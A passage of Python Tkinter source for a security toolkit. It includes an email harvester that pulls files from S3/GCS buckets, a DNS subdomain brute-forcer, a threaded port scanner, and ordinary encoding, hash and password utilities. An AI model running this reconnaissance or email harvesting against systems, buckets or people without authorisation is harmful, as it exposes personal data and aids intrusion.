        ttk.Spinbox(select_frame, from_=10, to=500, textvariable=max_files_var, width=10).pack(side=tk.LEFT, padx=5)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=20, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def extract_emails():
            bucket_name = bucket_var.get()
            if not bucket_name:
                messagebox.showwarning("Warning", "Select a bucket!")
                return
            
            bucket = next((b for b in self.buckets if b.name == bucket_name), None)
            if not bucket:
                messagebox.showerror("Error", "Bucket not found!")
                return
            
            max_files = max_files_var.get()
            progress.start()
            status_var.set(f"Extracting emails from {min(max_files, len(bucket.files))} files...")
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"📧 Extracting emails from bucket: {bucket_name}\n")
            results_text.insert(tk.END, "=" * 60 + "\n\n")
            
            all_emails = set()
            
            def extract_task():
                scanned = 0
                for file_info in bucket.files[:max_files]:
                    scanned += 1
                    status_var.set(f"Processing {scanned}/{min(max_files, len(bucket.files))}: {file_info.path[:50]}...")
                    win.update()
                    
                    if bucket.provider == Provider.AWS_S3:
                        url = f"https://{bucket_name}.s3.amazonaws.com/{file_info.path}"
                    else:
                        url = f"https://storage.googleapis.com/{bucket_name}/{file_info.path}"
                    
                    try:
                        resp = self.session.get(url, timeout=10)
                        if resp.status_code == 200:
                            content = resp.content.decode('utf-8', errors='ignore')
                            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                            for e in emails:
                                all_emails.add(e.lower())
                    except:
                        pass
                
                progress.stop()
                status_var.set(f"Extraction complete! Found {len(all_emails)} unique emails")
                results_text.insert(tk.END, f"\n📊 Found {len(all_emails)} unique email addresses:\n\n")
                for e in sorted(all_emails):
                    results_text.insert(tk.END, f"{e}\n")
                messagebox.showinfo("Extraction Complete", f"Found {len(all_emails)} emails!")
            
            threading.Thread(target=extract_task, daemon=True).start()
        
        ttk.Button(win, text="Extract Emails", command=extract_emails, style='Primary.TButton').pack(pady=10)
    
    def open_dns_enum(self):
        """Open DNS enumerator window"""
        win = tk.Toplevel(self.root)
        win.title("DNS Enumerator")
        win.geometry("800x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="DNS Enumerator", style='Title.TLabel').pack(pady=10)
        
        input_frame = ttk.Frame(win)
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(input_frame, text="Domain:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        domain_var = tk.StringVar()
        ttk.Entry(input_frame, textvariable=domain_var, width=50, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        ttk.Label(input_frame, text="Wordlist:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
        wordlist_var = tk.StringVar()
        wordlist_entry = ttk.Entry(input_frame, textvariable=wordlist_var, width=30)
        wordlist_entry.pack(side=tk.LEFT, padx=5)
        ttk.Button(input_frame, text="Browse", command=lambda: wordlist_var.set(filedialog.askopenfilename())).pack(side=tk.LEFT, padx=2)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=20, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def enumerate_dns():
            domain = domain_var.get().strip()
            if not domain:
                messagebox.showwarning("Warning", "Enter a domain!")
                return
            
            # Common subdomains
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns',
                'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2',
                'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 'docs',
                'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 'web', 'media',
                'email', 'images', 'img', 'download', 'dns', 'piwik', 'stats', 'dashboard', 'portal',
                'manage', 'start', 'info', 'app', 'apps', 'api', 'apis', 'auth', 'login', 'signin',
                'signup', 'register', 'account', 'accounts', 'user', 'users', 'profile', 'profiles',
                'admin', 'administrator', 'manage', 'management', 'control', 'panel', 'dashboard',
                'portal', 'gateway', 'proxy', 'cdn', 'static', 'assets', 'media', 'img', 'image',
                'images', 'video', 'videos', 'audio', 'files', 'download', 'uploads', 'backup',
                'backups', 'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'cache', 'session',
                'sessions', 'auth', 'oauth', 'sso', 'login', 'logout', 'signin', 'signout'
            ]
            
            # Load custom wordlist
            subdomains = common_subdomains.copy()
            if wordlist_var.get() and os.path.exists(wordlist_var.get()):
                with open(wordlist_var.get(), 'r') as f:
                    for line in f:
                        word = line.strip()
                        if word:
                            subdomains.append(word)
            
            subdomains = list(set(subdomains))
            
            progress.start()
            status_var.set(f"Enumerating {len(subdomains)} subdomains...")
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🔍 DNS Enumeration for: {domain}\n")
            results_text.insert(tk.END, f"Checking {len(subdomains)} subdomains...\n")
            results_text.insert(tk.END, "=" * 60 + "\n\n")
            
            found = []
            
            def check_subdomain(sub):
                hostname = f"{sub}.{domain}"
                try:
                    ip = socket.gethostbyname(hostname)
                    return (hostname, ip)
                except:
                    return None
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(check_subdomain, sub) for sub in subdomains]
                for i, future in enumerate(as_completed(futures)):
                    result = future.result()
                    if result:
                        hostname, ip = result
                        found.append(result)
                        results_text.insert(tk.END, f"✅ {hostname} → {ip}\n")
                        results_text.see(tk.END)
                    status_var.set(f"Progress: {i+1}/{len(subdomains)}")
                    win.update()
            
            progress.stop()
            status_var.set(f"Enumeration complete! Found {len(found)} subdomains")
            results_text.insert(tk.END, f"\n{'='*60}\n")
            results_text.insert(tk.END, f"✅ Found {len(found)} subdomains for {domain}\n")
            
            messagebox.showinfo("DNS Enumeration Complete", f"Found {len(found)} subdomains!")
        
        ttk.Button(win, text="Start Enumeration", command=enumerate_dns, style='Primary.TButton').pack(pady=10)
    
    def open_hash_generator(self):
        """Open hash generator tool"""
        win = tk.Toplevel(self.root)
        win.title("Hash Generator")
        win.geometry("700x600")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Hash Generator", style='Title.TLabel').pack(pady=10)
        
        ttk.Label(win, text="Input Text:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        input_text = scrolledtext.ScrolledText(win, height=8, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        input_text.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(win, text="Or Select File:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        file_frame = ttk.Frame(win)
        file_frame.pack(fill=tk.X, padx=10, pady=5)
        file_var = tk.StringVar()
        ttk.Entry(file_frame, textvariable=file_var, width=60).pack(side=tk.LEFT, padx=5)
        ttk.Button(file_frame, text="Browse", command=lambda: file_var.set(filedialog.askopenfilename())).pack(side=tk.LEFT, padx=5)
        
        def generate_hashes():
            text = input_text.get(1.0, tk.END).strip()
            file_path = file_var.get()
            
            if text:
                data = text.encode()
            elif file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    data = f.read()
            else:
                messagebox.showwarning("Warning", "Enter text or select a file!")
                return
            
            output.delete(1.0, tk.END)
            output.insert(tk.END, f"MD5:     {hashlib.md5(data).hexdigest()}\n")
            output.insert(tk.END, f"SHA1:    {hashlib.sha1(data).hexdigest()}\n")
            output.insert(tk.END, f"SHA256:  {hashlib.sha256(data).hexdigest()}\n")
            output.insert(tk.END, f"SHA512:  {hashlib.sha512(data).hexdigest()}\n")
            output.insert(tk.END, f"MD4:     {hashlib.new('md4', data).hexdigest()}\n")
            output.insert(tk.END, f"MD5 (base64): {base64.b64encode(hashlib.md5(data).digest()).decode()}\n")
            output.insert(tk.END, f"SHA1 (base64): {base64.b64encode(hashlib.sha1(data).digest()).decode()}\n")
            
            # Update file info if file was selected
            if file_path:
                output.insert(tk.END, f"\nFile: {os.path.basename(file_path)}\n")
                output.insert(tk.END, f"Size: {self.format_size(len(data))}\n")
        
        ttk.Button(win, text="Generate Hashes", command=generate_hashes, style='Primary.TButton').pack(pady=10)
        
        ttk.Label(win, text="Results:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        output = scrolledtext.ScrolledText(win, height=12, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        output.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Button(win, text="Copy Results", command=lambda: self.copy_to_clipboard(output.get(1.0, tk.END)), style='Accent.TButton').pack(pady=5)
    
    def open_base64_tool(self):
        """Open Base64 encoder/decoder tool"""
        win = tk.Toplevel(self.root)
        win.title("Base64 Tool")
        win.geometry("800x600")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Base64 Encoder / Decoder", style='Title.TLabel').pack(pady=10)
        
        # Input
        ttk.Label(win, text="Input:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        input_text = scrolledtext.ScrolledText(win, height=8, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        input_text.pack(fill=tk.X, padx=10, pady=5)
        
        # Options
        options_frame = ttk.Frame(win)
        options_frame.pack(fill=tk.X, padx=10, pady=5)
        
        url_safe_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(options_frame, text="URL-Safe Base64", variable=url_safe_var).pack(side=tk.LEFT, padx=10)
        
        # Buttons
        btn_frame = ttk.Frame(win)
        btn_frame.pack(pady=10)
        
        def encode():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                if url_safe_var.get():
                    encoded = base64.urlsafe_b64encode(text.encode()).decode()
                else:
                    encoded = base64.b64encode(text.encode()).decode()
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, encoded)
        
        def decode():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                try:
                    if url_safe_var.get():
                        decoded = base64.urlsafe_b64decode(text).decode()
                    else:
                        decoded = base64.b64decode(text).decode()
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, decoded)
                except Exception as e:
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, f"Error: {str(e)}")
        
        ttk.Button(btn_frame, text="Encode →", command=encode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Decode ←", command=decode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Clear", command=lambda: (input_text.delete(1.0, tk.END), output_text.delete(1.0, tk.END))).pack(side=tk.LEFT, padx=5)
        
        # Output
        ttk.Label(win, text="Output:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        output_text = scrolledtext.ScrolledText(win, height=8, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Button(win, text="Copy Output", command=lambda: self.copy_to_clipboard(output_text.get(1.0, tk.END)), style='Accent.TButton').pack(pady=5)
    
    def open_url_tool(self):
        """Open URL encoder/decoder tool"""
        win = tk.Toplevel(self.root)
        win.title("URL Tool")
        win.geometry("800x600")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="URL Encoder / Decoder", style='Title.TLabel').pack(pady=10)
        
        ttk.Label(win, text="Input:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        input_text = scrolledtext.ScrolledText(win, height=8, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        input_text.pack(fill=tk.X, padx=10, pady=5)
        
        btn_frame = ttk.Frame(win)
        btn_frame.pack(pady=10)
        
        def encode():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                encoded = urllib.parse.quote(text, safe='')
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, encoded)
        
        def encode_plus():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                encoded = urllib.parse.quote_plus(text)
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, encoded)
        
        def decode():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                try:
                    decoded = urllib.parse.unquote(text)
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, decoded)
                except:
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, "Error: Invalid URL encoding")
        
        def decode_plus():
            text = input_text.get(1.0, tk.END).strip()
            if text:
                try:
                    decoded = urllib.parse.unquote_plus(text)
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, decoded)
                except:
                    output_text.delete(1.0, tk.END)
                    output_text.insert(1.0, "Error: Invalid URL encoding")
        
        ttk.Button(btn_frame, text="Encode (RFC 3986)", command=encode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Encode+ (form)", command=encode_plus, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Decode", command=decode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Decode+", command=decode_plus, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        
        ttk.Label(win, text="Output:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        output_text = scrolledtext.ScrolledText(win, height=8, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Button(win, text="Copy Output", command=lambda: self.copy_to_clipboard(output_text.get(1.0, tk.END)), style='Accent.TButton').pack(pady=5)
    
    def open_json_tool(self):
        """Open JSON formatter tool"""
        win = tk.Toplevel(self.root)
        win.title("JSON Tool")
        win.geometry("900x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="JSON Formatter & Validator", style='Title.TLabel').pack(pady=10)
        
        # Input
        ttk.Label(win, text="Input JSON:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        input_text = scrolledtext.ScrolledText(win, height=12, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        input_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Options
        options_frame = ttk.Frame(win)
        options_frame.pack(fill=tk.X, padx=10, pady=5)
        
        indent_var = tk.IntVar(value=2)
        ttk.Label(options_frame, text="Indent:").pack(side=tk.LEFT, padx=5)
        ttk.Spinbox(options_frame, from_=2, to=8, textvariable=indent_var, width=5).pack(side=tk.LEFT, padx=5)
        
        sort_keys_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Sort Keys", variable=sort_keys_var).pack(side=tk.LEFT, padx=10)
        
        def format_json():
            text = input_text.get(1.0, tk.END).strip()
            if not text:
                return
            
            try:
                data = json.loads(text)
                indent = indent_var.get()
                sort_keys = sort_keys_var.get()
                formatted = json.dumps(data, indent=indent, sort_keys=sort_keys, ensure_ascii=False)
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, formatted)
                
                # Show stats
                stats_var.set(f"Valid JSON | {len(str(data))} chars | {len(str(formatted))} chars formatted")
            except json.JSONDecodeError as e:
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, f"Error: Invalid JSON\n\n{e}")
                stats_var.set("Invalid JSON")
        
        def minify_json():
            text = input_text.get(1.0, tk.END).strip()
            if not text:
                return
            
            try:
                data = json.loads(text)
                minified = json.dumps(data, separators=(',', ':'))
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, minified)
                stats_var.set(f"Minified: {len(minified)} chars")
            except json.JSONDecodeError as e:
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, f"Error: {e}")
        
        def validate_json():
            text = input_text.get(1.0, tk.END).strip()
            if not text:
                return
            
            try:
                json.loads(text)
                messagebox.showinfo("Validation", "Valid JSON!")
                stats_var.set("Valid JSON")
            except json.JSONDecodeError as e:
                messagebox.showerror("Validation Error", str(e))
                stats_var.set(f"Invalid: {e}")
        
        btn_frame = ttk.Frame(win)
        btn_frame.pack(pady=10)
        ttk.Button(btn_frame, text="Format", command=format_json, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Minify", command=minify_json, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Validate", command=validate_json, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Clear", command=lambda: (input_text.delete(1.0, tk.END), output_text.delete(1.0, tk.END))).pack(side=tk.LEFT, padx=5)
        
        # Output
        ttk.Label(win, text="Formatted Output:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        output_text = scrolledtext.ScrolledText(win, height=12, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        stats_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=stats_var, foreground=self.colors['accent']).pack(pady=5)
        
        ttk.Button(win, text="Copy Output", command=lambda: self.copy_to_clipboard(output_text.get(1.0, tk.END)), style='Accent.TButton').pack(pady=5)
    
    def open_regex_tool(self):
        """Open regex tester tool"""
        win = tk.Toplevel(self.root)
        win.title("Regex Tester")
        win.geometry("900x800")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Regex Tester", style='Title.TLabel').pack(pady=10)
        
        # Pattern
        ttk.Label(win, text="Regular Expression:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        pattern_frame = ttk.Frame(win)
        pattern_frame.pack(fill=tk.X, padx=10, pady=5)
        pattern_var = tk.StringVar()
        ttk.Entry(pattern_frame, textvariable=pattern_var, width=70, font=('Consolas', 11)).pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Flags
        flags_frame = ttk.Frame(win)
        flags_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ignore_case_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(flags_frame, text="Ignore Case (i)", variable=ignore_case_var).pack(side=tk.LEFT, padx=5)
        
        multiline_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(flags_frame, text="Multiline (m)", variable=multiline_var).pack(side=tk.LEFT, padx=5)
        
        dotall_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(flags_frame, text="Dot All (s)", variable=dotall_var).pack(side=tk.LEFT, padx=5)
        
        unicode_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(flags_frame, text="Unicode (u)", variable=unicode_var).pack(side=tk.LEFT, padx=5)
        
        # Test text
        ttk.Label(win, text="Test Text:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        test_text = scrolledtext.ScrolledText(win, height=12, bg='#1e1e1e', fg='white', font=('Consolas', 10))
        test_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Buttons
        btn_frame = ttk.Frame(win)
        btn_frame.pack(pady=10)
        
        def test_regex():
            pattern = pattern_var.get()
            if not pattern:
                messagebox.showwarning("Warning", "Enter a regular expression!")
                return
            
            text = test_text.get(1.0, tk.END)
            
            flags = 0
            if ignore_case_var.get():
                flags |= re.IGNORECASE
            if multiline_var.get():
                flags |= re.MULTILINE
            if dotall_var.get():
                flags |= re.DOTALL
            if unicode_var.get():
                flags |= re.UNICODE
            
            try:
                regex = re.compile(pattern, flags)
                matches = list(regex.finditer(text))
                
                output_text.delete(1.0, tk.END)
                
                if matches:
                    output_text.insert(tk.END, f"Found {len(matches)} match(es):\n\n")
                    for i, match in enumerate(matches, 1):
                        output_text.insert(tk.END, f"{i}. '{match.group()}'\n")
                        output_text.insert(tk.END, f"   Position: {match.start()}-{match.end()}\n")
                        if match.groups():
                            output_text.insert(tk.END, f"   Groups: {match.groups()}\n")
                        output_text.insert(tk.END, "\n")
                    
                    stats_var.set(f"Found {len(matches)} matches")
                else:
                    output_text.insert(tk.END, "No matches found.")
                    stats_var.set("No matches")
                    
            except re.error as e:
                output_text.delete(1.0, tk.END)
                output_text.insert(1.0, f"Regex Error: {e}")
                stats_var.set(f"Error: {e}")
        
        ttk.Button(btn_frame, text="Test Regex", command=test_regex, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Clear", command=lambda: (test_text.delete(1.0, tk.END), output_text.delete(1.0, tk.END))).pack(side=tk.LEFT, padx=5)
        
        # Output
        ttk.Label(win, text="Matches:", style='Heading.TLabel').pack(anchor=tk.W, padx=10)
        output_text = scrolledtext.ScrolledText(win, height=10, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        stats_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=stats_var, foreground=self.colors['accent']).pack(pady=5)
        
        ttk.Button(win, text="Copy Matches", command=lambda: self.copy_to_clipboard(output_text.get(1.0, tk.END)), style='Accent.TButton').pack(pady=5)
    
    def open_password_generator(self):
        """Open password generator tool"""
        win = tk.Toplevel(self.root)
        win.title("Password Generator")
        win.geometry("600x500")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Password Generator", style='Title.TLabel').pack(pady=10)
        
        # Length
        length_frame = ttk.LabelFrame(win, text="Password Length")
        length_frame.pack(fill=tk.X, padx=20, pady=10)
        
        length_var = tk.IntVar(value=16)
        length_scale = ttk.Scale(length_frame, from_=8, to=64, variable=length_var, orient=tk.HORIZONTAL)
        length_scale.pack(fill=tk.X, padx=10, pady=10)
        ttk.Label(length_frame, textvariable=length_var).pack()
        
        # Character sets
        chars_frame = ttk.LabelFrame(win, text="Character Sets")
        chars_frame.pack(fill=tk.X, padx=20, pady=10)
        
        uppercase_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(chars_frame, text="Uppercase (A-Z)", variable=uppercase_var).pack(anchor=tk.W, padx=10, pady=2)
        
        lowercase_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(chars_frame, text="Lowercase (a-z)", variable=lowercase_var).pack(anchor=tk.W, padx=10, pady=2)
        
        digits_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(chars_frame, text="Digits (0-9)", variable=digits_var).pack(anchor=tk.W, padx=10, pady=2)
        
        symbols_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(chars_frame, text="Symbols (!@#$%^&*)", variable=symbols_var).pack(anchor=tk.W, padx=10, pady=2)
        
        ambiguous_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(chars_frame, text="Exclude Ambiguous Characters (il1Lo0O)", variable=ambiguous_var).pack(anchor=tk.W, padx=10, pady=2)
        
        # Generate button
        def generate_password():
            length = length_var.get()
            characters = ""
            
            if uppercase_var.get():
                characters += string.ascii_uppercase
            if lowercase_var.get():
                characters += string.ascii_lowercase
            if digits_var.get():
                characters += string.digits
            if symbols_var.get():
                characters += "!@#$%^&*()_+-=[]{}|;:,.<>?"
            
            if not characters:
                characters = string.ascii_letters + string.digits
            
            if ambiguous_var.get():
                for c in 'il1Lo0O':
                    characters = characters.replace(c, '')
            
            password = ''.join(secrets.choice(characters) for _ in range(length))
            password_output.delete(1.0, tk.END)
            password_output.insert(1.0, password)
            
            # Calculate entropy
            charset_size = len(characters)
            entropy = length * (charset_size.bit_length())
            entropy_var.set(f"Entropy: ~{entropy} bits")
        
        ttk.Button(win, text="Generate Password", command=generate_password, style='Primary.TButton').pack(pady=10)
        
        # Output
        password_output = scrolledtext.ScrolledText(win, height=3, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 12))
        password_output.pack(fill=tk.X, padx=20, pady=10)
        
        entropy_var = tk.StringVar(value="Entropy: ~0 bits")
        ttk.Label(win, textvariable=entropy_var, foreground=self.colors['cyan']).pack()
        
        # Buttons
        btn_frame = ttk.Frame(win)
        btn_frame.pack(pady=10)
        ttk.Button(btn_frame, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(password_output.get(1.0, tk.END).strip()), style='Accent.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Generate Another", command=generate_password).pack(side=tk.LEFT, padx=5)
        
        # Generate initial password
        generate_password()
    
    def open_port_scanner(self):
        """Open port scanner tool"""
        win = tk.Toplevel(self.root)
        win.title("Port Scanner")
        win.geometry("800x600")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Port Scanner", style='Title.TLabel').pack(pady=10)
        
        # Target
        target_frame = ttk.Frame(win)
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(target_frame, text="Target:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        target_var = tk.StringVar()
        ttk.Entry(target_frame, textvariable=target_var, width=40, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        ttk.Label(target_frame, text="Ports:", style='Heading.TLabel').pack(side=tk.LEFT, padx=20)
        ports_var = tk.StringVar(value="1-1000")
        ttk.Entry(target_frame, textvariable=ports_var, width=20, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        # Options
        options_frame = ttk.Frame(win)
        options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        timeout_var = tk.DoubleVar(value=1.0)
        ttk.Label(options_frame, text="Timeout (s):").pack(side=tk.LEFT, padx=5)
        ttk.Spinbox(options_frame, from_=0.5, to=5.0, textvariable=timeout_var, width=8, increment=0.5).pack(side=tk.LEFT, padx=5)
        
        threads_var = tk.IntVar(value=100)
        ttk.Label(options_frame, text="Threads:").pack(side=tk.LEFT, padx=20)
        ttk.Spinbox(options_frame, from_=10, to=500, textvariable=threads_var, width=8).pack(side=tk.LEFT, padx=5)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
        status_var = tk.StringVar(value="Ready")
        ttk.Label(win, textvariable=status_var, foreground=self.colors['accent']).pack(pady=5)
        
        results_text = scrolledtext.ScrolledText(win, height=18, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def scan_ports():
            target = target_var.get().strip()
            if not target:
                messagebox.showwarning("Warning", "Enter a target!")
                return
            
            port_range = ports_var.get()
            ports = []
            
            if '-' in port_range:
                start, end = map(int, port_range.split('-'))
                ports = list(range(start, min(end + 1, 65535)))
            elif ',' in port_range:
                ports = [int(p.strip()) for p in port_range.split(',')]
            else:
                ports = [int(port_range)]
            
            timeout = timeout_var.get()
            max_threads = threads_var.get()
            
            results_text.delete(1.0, tk.END)
            results_text.insert(tk.END, f"🔍 Scanning {target}\n")
            results_text.insert(tk.END, f"Ports: {len(ports)} ports\n")
            results_text.insert(tk.END, f"Timeout: {timeout}s\n")
            results_text.insert(tk.END, "=" * 50 + "\n\n")
            
            progress['maximum'] = len(ports)
            progress['value'] = 0
            
            open_ports = []
            scanned = 0
            
            def scan_port(port):
                nonlocal scanned
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    sock.close()
                    scanned += 1
                    progress['value'] = scanned
                    if result == 0:
                        return port
                except:
                    pass
                return None
            
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = [executor.submit(scan_port, port) for port in ports]
                for future in as_completed(futures):
                    port = future.result()
                    if port:
                        open_ports.append(port)
                        results_text.insert(tk.END, f"✅ Port {port}: OPEN\n")
                        results_text.see(tk.END)
                    status_var.set(f"Scanned: {scanned}/{len(ports)} ports | Open: {len(open_ports)}")
                    win.update()
            
            progress['value'] = 0
            results_text.insert(tk.END, f"\n{'='*50}\n")
            results_text.insert(tk.END, f"✅ Scan complete! Found {len(open_ports)} open ports.\n")
            
            if open_ports:
                results_text.insert(tk.END, f"\nOpen ports: {', '.join(map(str, open_ports))}\n")
            
            status_var.set(f"Complete - Found {len(open_ports)} open ports")
            messagebox.showinfo("Scan Complete", f"Found {len(open_ports)} open ports on {target}")
        
        ttk.Button(win, text="Start Scan", command=scan_ports, style='Primary.TButton').pack(pady=10)
    
    def open_subdomain_scanner(self):
        """Open subdomain scanner tool"""
        win = tk.Toplevel(self.root)
        win.title("Subdomain Scanner")
        win.geometry("800x700")
        win.configure(bg='#0a0a0a')
        
        ttk.Label(win, text="Subdomain Scanner", style='Title.TLabel').pack(pady=10)
        
        # Target
        target_frame = ttk.Frame(win)
        target_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(target_frame, text="Domain:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        domain_var = tk.StringVar()
        ttk.Entry(target_frame, textvariable=domain_var, width=50, font=('Consolas', 11)).pack(side=tk.LEFT, padx=5)
        
        # Wordlist
        wordlist_frame = ttk.Frame(win)
        wordlist_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(wordlist_frame, text="Wordlist:", style='Heading.TLabel').pack(side=tk.LEFT, padx=5)
        wordlist_var = tk.StringVar()
        ttk.Entry(wordlist_frame, textvariable=wordlist_var, width=50).pack(side=tk.LEFT, padx=5)
        ttk.Button(wordlist_frame, text="Browse", command=lambda: wordlist_var.set(filedialog.askopenfilename())).pack(side=tk.LEFT, padx=5)
        
        progress = ttk.Progressbar(win, mode='indeterminate', style='Accent.Horizontal.TProgressbar')
        progress.pack(fill=tk.X, padx=10, pady=10)
        
